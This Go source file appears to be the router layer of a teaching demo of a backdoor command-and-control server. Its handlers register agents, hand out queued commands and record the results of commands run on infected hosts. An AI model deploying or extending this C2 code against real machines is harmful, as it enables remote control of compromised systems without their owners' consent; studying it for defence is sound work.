/*

Copyright (c) 2018 sec.lu

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THEq
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/

package routers

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"

	"github.com/gin-gonic/gin"

	"sec-dev-in-action-src/backdoor/command-control/command-control-demo/server/models"
)

func Ping(c *gin.Context) {
	var agent models.Agent
	err := c.BindJSON(&agent)
	fmt.Println(agent, err)
	agentId := agent.AgentId
	has, err := models.ExistAgentId(agentId)
	if err == nil && has {
		_ = models.UpdateAgent(agentId)
	} else {
		err = agent.Insert()
		fmt.Println(err)
	}
}

func GetCommand(c *gin.Context) {
	agnetId := c.Param("uuid")
	cmds, _ := models.ListCommandByAgentId(agnetId)
	cmdJson, _ := json.Marshal(cmds)
	fmt.Println(agnetId, string(cmdJson))
	c.JSON(http.StatusOK, cmds)
}

func SendResult(c *gin.Context) {
	cmdId := c.Param("id")
	result := c.PostForm("result")
	id, _ := strconv.Atoi(cmdId)
	err := models.UpdateCommandResult(int64(id), result)
	fmt.Println(cmdId, result, err, c.Request.PostForm)
	if err == nil {
		err = models.SetCmdStatusToFinished(int64(id))
	}
}
